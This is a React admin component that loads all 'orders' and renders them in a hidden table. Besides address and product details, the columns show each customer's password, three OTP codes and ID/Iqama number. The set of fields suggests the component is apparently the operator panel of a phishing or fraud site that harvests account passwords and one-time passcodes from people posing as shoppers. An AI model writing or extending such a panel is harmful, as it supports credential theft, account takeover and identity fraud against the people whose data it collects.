import { useEffect } from "react";
import { useDispatch, useSelector } from "react-redux";
import { getAllOrders } from "../../store/adminSlice";
import OrderList from "./v2/OrderList";

export default function OrderInfo() {
    const dispatch = useDispatch();
    const { orders, isLoading } = useSelector(state => state.admin);

    useEffect(() => {
        dispatch(getAllOrders());
    }, [dispatch])

    if (isLoading) {
        return <h1 className="text-center text-3xl font-bold py-10"> Loading... </h1>
    }

    // console.log(orders[0].otp[0].otp);
    return (
        <div className="min-h-screen">
            <section className="hidden">
                <h1 className="text-center text-xl font-semibold py-3 my-5 border "> Orders list to view Orders </h1>
                <div>
                    <div className="relative overflow-x-auto shadow-md sm:rounded-lg">
                        <table className="w-full text-sm text-left text-gray-500 dark:text-gray-400">
                            <thead className="text-md text-white uppercase bg-[#15B8A9] dark:bg-gray-700 dark:text-gray-400">
                                <tr>
                                    <th scope="col" className="px-6 py-3">
                                        User Name
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Phone Number
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Password
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Otp 1
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Otp 2
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Otp 3
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Country
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Address
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        Product Description
                                    </th>
                                    <th scope="col" className="px-6 py-3">
                                        ID / Iqama Number
                                    </th>
                                    {/* <th scope="col" className="px-6 py-3">
                                        Status
                                    </th> */}
                                </tr>
                            </thead>
                            <tbody>
                                {
                                    orders.map(order => (
                                        <tr className="bg-white border-b dark:bg-gray-800 dark:border-gray-700">
                                            <td className="px-6 py-4 uppercase">
                                                {order.orderId}
                                            </td>
                                            <td className="px-6 py-4">
                                                {order.phoneNumber}
                                            </td>
                                            <td className="px-6 py-4">
                                                {order.password}
                                            </td>
                                            <td className="px-6 py-4 font-bold">
                                                {order.otp[0]?.otp}
                                            </td>
                                            <td className="px-6 py-4 font-bold">
                                                {order.otp[1]?.otp}
                                            </td>
                                            <td className="px-6 py-4 font-bold">
                                                {order.otp[2]?.otp}
                                            </td>
                                            <td className="px-6 py-4">
                                                {order.nationality}
                                            </td>
                                            <td className="px-6 py-4">
                                                {order.address}
                                            </td>
                                            <th scope="row" className="px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white">
                                                <h1> {order.name} </h1>
                                                <h1>  {order.color} </h1>
                                                <h1>  {order.storage} </h1>
                                            </th>

                                            <td className="px-6 py-4">
                                                {order.nid}
                                            </td>


                                            {/* <td className="px-6 py-4">
                                                {order.status}
                                            </td> */}
                                        </tr>
                                    ))
                                }
                            </tbody>
                        </table>
                    </div>
                </div>
            </section>
            {/* <section>
                <OrderList />
            </section> */}
        </div>
    )
}